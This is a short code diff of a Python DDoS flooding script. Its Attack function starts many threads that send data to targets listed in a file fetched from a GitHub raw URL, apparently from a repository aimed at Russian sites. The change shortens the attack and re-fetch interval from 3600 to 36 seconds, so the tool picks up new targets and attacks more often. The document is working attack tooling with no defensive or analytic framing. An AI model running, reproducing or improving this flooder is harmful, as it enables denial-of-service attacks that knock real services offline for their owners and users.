@@ -26,7 +26,7 @@ def Attack(target, port, kbytes, timeout):
         print(Error)
  
 while 1 == 1:
-    timeout=time.time()+3600
+    timeout=time.time()+36
     testfile = urllib.request.urlretrieve ("https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt", "target.txt")
     
     with open("target.txt",'r') as f:
@@ -41,4 +41,4 @@ while 1 == 1:
             for i in range(count_threads):
                 #print ("Starting %s thread", i)
                 threading.Thread(target=Attack, args=(trgt[0], int(trgt[1]), 1024, timeout,)).start()
-    time.sleep(3600)
+    time.sleep(36)
